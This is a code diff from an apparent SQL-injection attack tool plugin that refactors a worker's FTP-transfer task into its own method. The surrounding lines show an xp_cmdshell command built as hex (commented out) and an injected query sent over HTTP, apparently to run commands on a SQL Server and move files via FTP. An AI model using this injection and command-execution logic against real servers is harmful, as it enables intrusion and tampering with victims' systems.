@@ -122,6 +122,14 @@ class Worker(QtCore.QThread):
             
     def run(self):
         self.logSignal.emit("+++ [" + PLUGIN_NAME + "]: TASK STARTED +++")
+        #--------Task----------
+        self.ftpTransferTask()
+        #-----------------------
+        self.taskDoneSignal.emit()
+        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
+        
+        
+    def ftpTransferTask(self):
         #if defined non-standart ftp port
         ipaddr = self.vars['ip'].replace(":", " ")
         ftpFiles = self.vars['ftpFiles']
@@ -174,7 +182,4 @@ class Worker(QtCore.QThread):
         #self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
         query = self.wq.buildQuery(self.qstring, self.vars)
         self.wq.httpRequest(query, True, self.vars)
-        
-        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
-        self.taskDoneSignal.emit()
         
